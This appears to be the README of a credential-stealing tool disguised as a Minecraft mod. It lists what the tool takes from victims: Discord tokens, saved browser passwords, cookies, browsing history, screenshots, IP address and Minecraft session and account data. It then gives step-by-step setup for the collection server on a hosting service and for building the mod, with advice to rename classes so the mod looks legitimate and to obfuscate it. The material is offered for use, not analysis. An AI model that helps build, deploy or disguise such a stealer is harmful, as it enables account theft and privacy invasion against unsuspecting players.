# Features
- Impossible to delete the webhook
- Good spam protection
- Grabs
    - IP
    - Minecraft Session ID
    - Discord Tokens from:
        - Discord
        - Discord PTB
        - Discord Canary
        - Lightcord
        - Every popular chromium based browser
    - Saved browser passwords
    - Cookies
    - Browser history
    - Desktop screenshot
    - Minecraft accounts saved in lunar client
    - Minecraft accounts saved in essential
- Bypasses the restrictions on the max allowed key lenght
- Isn't reliant on any third party file hosting service like [Anonfiles](https://anonfiles.com) or [Gofile](https://gofile.io)
- Embeds and webhook customizable, no watermark

# Setup
## Server
Host on [render](https://render.com)
   1. Make a private fork of this repository
   2. Edit `server/config.json` to your liking
   3. Create a new render account with the GitHub account you forked the repository with
   4. Create a new web service
   5. Select the forked repository
   6. Put in a name for the service, select main as the branch, `server` as the root directory, Python 3 as runtime, Build command `pip install -r requirements.txt` and Start command `python main.py` or `python3 main.py`
   7. Wait for the service to build
## Mod/Client
   1. Download the repository
   2. Change the Server IP in `scr/main/java/dev/schubilegend/SchubiMod.java` to the IP of your VPS / URL of your render service
   3. Optional: Change the names of the classes/folders to make it look more legit
   4. Compile the mod (JDK 17 in your gradle settings and JDK 8 in your project settings)
#### OR

   **Optional: Obfuscate the mod**
